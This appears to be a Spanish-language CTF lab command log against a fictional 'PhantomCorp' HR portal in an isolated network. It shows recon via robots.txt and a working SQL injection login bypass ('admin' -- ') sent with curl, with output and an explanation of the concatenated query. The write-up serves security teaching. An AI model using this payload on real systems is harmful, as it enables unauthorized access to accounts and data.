# Bitácora de comandos — PhantomCorp "Clientes"

Entorno: `./ctf lab final` (`cyberlab-attacker` + `cyberlab-phantomcorp`, red
`labnet` aislada, sin puertos publicados al host). Todos los comandos se
ejecutaron desde la consola atacante (`make shell`).

## R1 — Recon / enumeración

```
$ curl -s http://phantomcorp/robots.txt
User-agent: *
Disallow: /portal-rrhh

$ curl -s http://phantomcorp/portal-rrhh
<!doctype html><title>Portal RRHH PhantomCorp</title><h1>Portal interno RRHH</h1>
<form method=post action=/portal/login><input name=user><input name=pass type=password></form>
<!-- recon: portal interno localizado. FLAG{final_recon_portal} -->
```

`robots.txt` es un mapa de lo que el sitio *no quiere* que se vea indexado —
nunca un control de acceso. Encontramos el portal "oculto" sin fuzzing: nos
lo dijo el propio servidor.

## R2 — Explotación (SQLi auth bypass)

```
$ curl -s -X POST http://phantomcorp/portal-rrhh/login \
    --data-urlencode "user=admin' -- " \
    --data-urlencode 'pass=x'
Bienvenido admin. Dashboard RRHH.
FLAG{final_sqli_foothold}
Backup de config disponible en: /backup/rrhh.conf
```

Control negativo (credenciales inválidas, sin inyección):
```
$ curl -s -X POST http://phantomcorp/portal-rrhh/login \
    --data-urlencode 'user=admin' --data-urlencode 'pass=wrongpass' \
    -o /dev/null -w '%{http_code}\n'
401
```

La consulta del backend es `SELECT user, rol FROM users WHERE user='<user>'
AND pass='<pass>'` armada por concatenación. `admin' -- ` cierra el literal y
comenta el resto de la cláusula (incluido el chequeo de password), por lo que
la query equivale a `... WHERE user='admin'` y siempre matchea a admin.

<!-- TODO: documentar R3 (loot del token) y R4 (impacto / crown jewels) -->
